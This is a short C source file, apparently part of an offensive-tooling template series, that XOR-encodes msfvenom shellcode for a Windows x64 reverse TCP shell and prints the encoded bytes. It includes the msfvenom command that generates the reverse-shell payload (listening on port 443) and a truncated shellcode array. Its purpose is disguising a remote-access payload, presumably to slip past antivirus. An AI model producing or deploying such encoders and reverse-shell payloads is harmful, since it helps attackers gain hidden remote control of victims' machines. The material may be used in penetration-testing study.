/* Below is an application of our basic template where, instead of encrypting
'test', we will encrypt a reverse shell*/

// msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f c
// This generated msfvenom hex will be encoded

#include <stdio.h>

unsigned char code[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc";
//The generated msfvenom payload will be much longer. The above is snipped.

int main() {
	//As noted in the basic template, single quotes are necessary for the key
	// Further comments are in the basic template file
	char key = 'K';
	int i = 0;
	for (i; i < sizeof(code); i++)
	{
		printf("\\x%02x", code[i] ^ key);
	}

	return 0;
};